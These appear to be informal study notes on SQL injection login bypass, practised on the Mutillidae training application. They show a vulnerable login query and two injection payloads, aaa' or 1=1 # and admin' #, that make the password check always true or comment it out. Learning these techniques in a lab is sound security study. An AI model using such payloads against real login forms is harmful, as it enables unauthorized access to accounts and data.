select * from accounts where username = 'admin' and password='aaa' 

we can insert in the password field just aaa' or 1=1 # 
after writing this it will be always true because after or we have 1=1 #

there is another way to inject 
# means after that it considers to be commented 

select * from accounts where username = 'admin' #' and password = '$password'

we insert in admin' #

this happens with mutilldae by giving the ip/mutilldae/index.php
